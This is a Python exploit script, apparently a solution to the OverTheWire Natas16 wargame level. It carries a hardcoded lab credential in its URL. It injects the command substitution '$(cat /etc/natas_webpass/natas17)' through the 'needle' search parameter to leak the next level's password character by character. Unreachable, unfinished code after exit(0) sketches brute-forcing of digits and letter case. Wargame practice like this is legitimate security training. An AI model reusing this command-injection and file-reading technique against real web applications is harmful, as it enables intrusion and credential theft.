import requests
import string
import itertools

url = "http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org"

potential_passwd = "#ps#h#gwbn#rd#s#gmadgqndkhpkq#cw"
potential_passwd = ""
passwd_len = 32
for i in range(len(potential_passwd), passwd_len):
	cmd = f"^$(expr substr $(cat /etc/natas_webpass/natas17) {i+1} 1)"

	r = requests.get(url, params={'needle': cmd})

	resp = r.text.split('Output:\n<pre>')[1].split("</pre>")[0]

	dict_values = resp.split('\n')[1:-1]

	if len(dict_values) > 0:
		potential_passwd += dict_values[0][0].lower()
		print(f"Got a char -- {potential_passwd}")
	else:
		# This is probably a number
		print("Got a potential number")
		potential_passwd += "#"

print(f"Potential password : {potential_passwd}")

exit(0)

number_digits = potential_passwd.count('#')

digits_comb = itertools.combinations_with_replacement([1,2,3,4,5,6,7,8,9,0], number_digits)

digit_potentials = []

for digits in digits_comb:
	potential = potential_passwd
	for digit in digits:
		potential = potential.replace("#", str(digit), 1)

	digit_potentials.append(potential)

all_potentials = []
for potential in digit_potentials:
	mixed_case_potential = map(''.join, itertools.product(*((c.upper(), c.lower()) for c in potential)))

	for test in mixed_case_potential:
		print(test)
	break


#print(potentials)

